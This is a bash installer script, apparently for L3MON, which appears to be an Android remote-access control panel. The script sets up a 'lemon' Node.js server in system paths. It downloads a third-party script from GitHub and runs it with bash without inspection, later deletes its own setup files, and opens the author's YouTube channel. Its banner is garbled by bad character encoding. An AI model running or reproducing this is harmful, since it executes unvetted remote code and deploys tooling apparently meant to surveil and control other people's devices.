#!/bin/bash

# Detect Environment
if [ -d "/data/data/com.termux/files/usr" ]; then
    IS_TERMUX=true
    INSTALL_DIR="/data/data/com.termux/files/usr/share/lemon"
    SHORTCUT_PATH="$PREFIX/bin/lemon"
    PKG_MANAGER="pkg"
    NODE_CMD="pkg install nodejs -y"
    OPEN_CMD="termux-open-url"
else
    IS_TERMUX=false
    INSTALL_DIR="/usr/share/lemon"
    SHORTCUT_PATH="/usr/local/bin/lemon"
    PKG_MANAGER="apt"
    NODE_CMD="apt install nodejs -y"
    OPEN_CMD="xdg-open"
fi

# Update & install basic packages
echo -e "\e[92m[+] Updating packages...\e[0m"
$PKG_MANAGER update -y && $PKG_MANAGER upgrade -y

echo -e "\e[92m[+] Installing required packages...\e[0m"
$PKG_MANAGER install proot wget nano yarn -y
eval "$NODE_CMD"

# Remove openjdk-17 if it exists
$PKG_MANAGER remove openjdk-17 -y 2>/dev/null

# Show full-color banner
clear
echo -e "\e[1;91m   â–ˆâ–ˆ      \e[1;92mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  \e[1;93mâ–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆ  \e[1;94mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  \e[1;95mâ–ˆâ–ˆâ–ˆ    â–ˆâ–ˆ \e[0m"
echo -e "\e[1;91m   â–ˆâ–ˆ      \e[1;92m     â–ˆâ–ˆ \e[1;93mâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  \e[1;94mâ–ˆâ–ˆ    â–ˆâ–ˆ \e[1;95mâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆ \e[0m"
echo -e "\e[1;91m   â–ˆâ–ˆ      \e[1;92m â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  \e[1;93mâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ  \e[1;94mâ–ˆâ–ˆ    â–ˆâ–ˆ \e[1;95mâ–ˆâ–ˆ â–ˆâ–ˆ  â–ˆâ–ˆ \e[0m"
echo -e "\e[1;91m   â–ˆâ–ˆ      \e[1;92m     â–ˆâ–ˆ \e[1;93mâ–ˆâ–ˆ  â–ˆâ–ˆ  â–ˆâ–ˆ  \e[1;94mâ–ˆâ–ˆ    â–ˆâ–ˆ \e[1;95mâ–ˆâ–ˆ  â–ˆâ–ˆ â–ˆâ–ˆ \e[0m"
echo -e "\e[1;91m   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ \e[1;92mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  \e[1;93mâ–ˆâ–ˆ      â–ˆâ–ˆ  \e[1;94mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  \e[1;95mâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆ \e[0m"
echo -e "\n\e[1;93m[âœ”] \e[92mCreated by \e[96mMahadeb R...das \e[93m/ \e[1;100;92m Debdas \e[0m\n"

# Download and run Java setup script
wget -q https://raw.githubusercontent.com/TheBizarreAbhishek/Java/refs/heads/main/java.sh
bash java.sh
clear

# Move project to install dir
echo -e "\e[93m[+] Installing to: $INSTALL_DIR\e[0m"
mkdir -p "$INSTALL_DIR"
mv -f app assets clientData includes index.js package.json package-lock.json "$INSTALL_DIR" || {
    echo -e "\e[1;91mâŒ Failed to move files to installation directory\e[0m"
    exit 1
}

# Create shortcut
echo -e "\e[92m[+] Creating shortcut command: lemon\e[0m"
echo -e "#!/bin/bash\ncd \"$INSTALL_DIR\" && node index.js" > "$SHORTCUT_PATH"
chmod +x "$SHORTCUT_PATH"

# Install express with yarn
cd "$INSTALL_DIR" || exit
yarn add express

# Final messages
clear
echo -e "\e[1;92m[âœ”] Installation complete!\e[0m"
sleep 2
echo -e "\e[1;96m[âˆš] Type \e[1;93mlemon \e[1;96mto start the server.\e[0m"
sleep 1
echo -e "\e[92mSubscribe my YouTube channel â€“ Thanks!\e[0m"
cd L3MON
rm java.sh setup.sh
cd
$OPEN_CMD https://youtube.com/@GODXSOCIETY
